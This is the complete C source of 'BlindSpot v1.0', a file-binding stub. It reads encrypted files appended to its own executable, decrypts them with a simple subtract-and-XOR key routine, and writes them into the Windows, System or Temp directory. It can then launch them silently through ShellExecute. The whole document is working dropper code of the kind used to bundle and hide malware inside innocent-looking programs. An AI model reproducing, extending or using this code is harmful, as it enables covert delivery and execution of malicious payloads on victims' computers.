/*
			BlindSpot v1.0
			- Small multiple file binding stub.

			Coded by: s134k
*/

#pragma optimize("gsy", on)
#pragma comment(linker, "/ENTRY:Entry")
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/MERGE:.reloc=.data")
#pragma comment(linker, "/SECTION:.text, EWR /IGNORE:4078")

#include <stdlib.h>
#include <windows.h>
#include <shellapi.h>

#define WIN32_LEAN_AND_MEAN
#define STUB_EOF 2048

struct file_data {
	char name[40];
	unsigned long size;
	int key;
	short path;
	short run;
} *pfile_data;

void DecryptRecord(char *szRec, unsigned long nLen, char *szKey)
{
	unsigned long i;
	char *p;

	p = szKey;

	for(i = 0; i < nLen; i++) {
		if(!(*p))
			p = szKey;

		*szRec -= *p;
		*szRec++ ^= *p++;
	}
}

int Entry(void)
{
	HANDLE hStub, hFile;
	DWORD dwBytesRead, dwBytesWritten;
	char szThisFile[_MAX_FNAME], szPath[MAX_PATH], szKey[5], *buf = "";
	struct file_data fd;

	pfile_data = &fd;

	GetModuleFileName(NULL, szThisFile, _MAX_FNAME);

	hStub = CreateFile(szThisFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	SetFilePointer(hStub, STUB_EOF, NULL, FILE_BEGIN);

	while(ReadFile(hStub, pfile_data, sizeof fd, &dwBytesRead, NULL) && dwBytesRead) {
		if(pfile_data->path == 1)
			GetSystemDirectory(szPath, sizeof szPath);
		else if(pfile_data->path == 2)
			GetTempPath(sizeof szPath, szPath);
		else
			GetWindowsDirectory(szPath, sizeof szPath);

		lstrcat(szPath, "\\");
		lstrcat(szPath, pfile_data->name);

		hFile = CreateFile(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile == INVALID_HANDLE_VALUE)
			return 1;

		wsprintf(szKey, "%d", pfile_data->key);

		buf = malloc(pfile_data->size);
		if(!buf)
			return 2;

		ReadFile(hStub, buf, pfile_data->size, &dwBytesRead, NULL);
		DecryptRecord(buf, dwBytesRead, szKey);
		WriteFile(hFile, buf, dwBytesRead, &dwBytesWritten, NULL);
		if(dwBytesWritten != dwBytesRead) {
			free(buf);
			CloseHandle(hStub);
			CloseHandle(hFile);

			return 3;
		}

		CloseHandle(hFile);
		free(buf);

		if(pfile_data->run)
			ShellExecute(NULL, "open", szPath, NULL, NULL, SW_SHOWNORMAL);
	}
	
	CloseHandle(hStub);

	return 0;
}
